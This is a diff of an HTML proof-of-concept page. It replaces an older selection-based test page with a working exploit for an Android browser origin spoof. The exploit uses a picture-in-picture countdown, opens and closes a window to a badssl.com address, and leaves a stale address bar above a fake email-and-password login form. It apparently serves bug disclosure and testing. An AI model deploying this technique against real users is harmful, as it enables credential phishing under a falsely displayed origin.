@@ -1,34 +1,136 @@
 
-<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
-                        <input id="spoof" style=";" ></input>
-
-<script>
-    function rfsSelectAll() {
-        document.execCommand("selectAll");
-      document.getElementById("spoof").style   = "";
-
-    }
-
-    function selectAllChildren() {
-        document.getSelection().selectAllChildren(paragraph1);
-    }
-</script>
-
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+html { font-family: sans-serif; }
+body {
+    overscroll-behavior: contain;
+}
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+#canvasElem { display: none; }
+.hide {
+    display: none;
+}
+</style>
+</head>
 <body>
+<div id="startContent">
+<h1>PoC: Android origin spoof due to stale address bar</h1>
+<p id="instructions">Tap to continue</p>
+</div>
+<div id="spoofContent" class="hide">
+<h1>Spoooo&#128123;oooof</h1>
+<p><b>(ooh, scary!)</b></p>
+<p><i>A wild login form has appeared!</i></p>
+<h2>You must login to continue</h2>
+<form action="/?form" method="get">
+    <input id="inputElem" name="email" placeholder="Email">
+    <br>
+    <input name="password" placeholder="Password" type="password">
+    <input type="submit">
+</form>
+<a href="/?forgotpassword">Forgot password?</a>
+</div>
+<canvas id="canvasElem"></canvas>
+<script>
+var spoofUrl = 'https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/';
 
+var delayToWaitForScroll = 1500;
 
+var newWin;
 
-    <img style="margin-top: 9999px;"></img>
+var pipWindow;
 
-    <p id="paragraph1">
-        <!-- Trigger Translate Menu -->
-        A[=
-        ?:TLv
-        S9y
-        <!-- Trigger Translate Menu -->
-    </p>
+var targetWidth = 1000;
+var targetHeight = 500;
 
-  <input onclick=""/>
+var drawCanvas = (text) => {
+    const ctx = canvasElem.getContext('2d');
+    canvasElem.width = targetWidth;
+    canvasElem.height = targetHeight;
+
+    ctx.fillStyle = `#fff`;
+    ctx.fillRect(0, 0, targetWidth, targetHeight);
+
+    ctx.fillStyle = '#000';
+    text = text;
+    var fontSize;
+    if (text.length == 1) {
+        // Single character
+        fontSize = 400;
+        ctx.font = fontSize+'px sans-serif';
+        ctx.fillText(text, (targetWidth/2)-90, (targetHeight/2)+(fontSize/2));
+    } else if (text.length > 1) {
+        var lines = text.split('\n');
+        if (lines.length === 2) {
+            fontSize = 150;
+            ctx.font = fontSize+'px sans-serif';
+            ctx.fillText(lines[0], 50, (targetHeight/2)+(fontSize/2) - 50);
+            ctx.fillText(lines[1], 50, (targetHeight/2)+(fontSize/2) + 80);
+        } else {
+            fontSize = 170;
+            ctx.font = fontSize+'px sans-serif';
+            ctx.fillText(text, 50, (targetHeight/2)+(fontSize/2));
+        }
+    }
+  }
+
+var createVideo = (canvasElem) => {
+    const video = document.createElement('video');
+    video.muted = true;
+    video.srcObject = canvasElem.captureStream();
+    video.play();
+    return video;
+}
+
+var videoElem = createVideo(canvasElem);
+
+var showingPiP = false;
+videoElem.addEventListener('enterpictureinpicture', function(event) {
+    showingPiP = true;
+    instructions.innerText = 'Tap again to continue';
+});
+
+// PiP call needs video to be ready, and video needs canvas to be drawn at least once to be ready
+drawCanvas('');
+
+var replaceContents = () => {
+    startContent.classList.add('hide');
+    spoofContent.classList.remove('hide');
+}
+
+var ran = false;
+
+window.addEventListener('click', () => {
+    if (!showingPiP) {
+        videoElem.requestPictureInPicture();
+        return;
+    }
+    if (ran) {
+        return;
+    }
+    ran = true;
+    newWin = window.open(spoofUrl, 'ao_spoof_test');
+    drawCanvas('3');
+    setTimeout(() => {
+        drawCanvas('2');
+    }, 1000);
+    setTimeout(() => {
+        drawCanvas('1');
+    }, 2000);
+    setTimeout(() => {
+        drawCanvas('Scroll down\nslowly');
+        //drawCanvas('Scroll down\nto continue');
+        //drawCanvas('Scroll down');
+        replaceContents();
+        setTimeout(() => {
+            newWin.close();
+            document.exitPictureInPicture();
+        }, delayToWaitForScroll);
+    }, 3000);
+});
+</script>
 </body>
-
 </html>
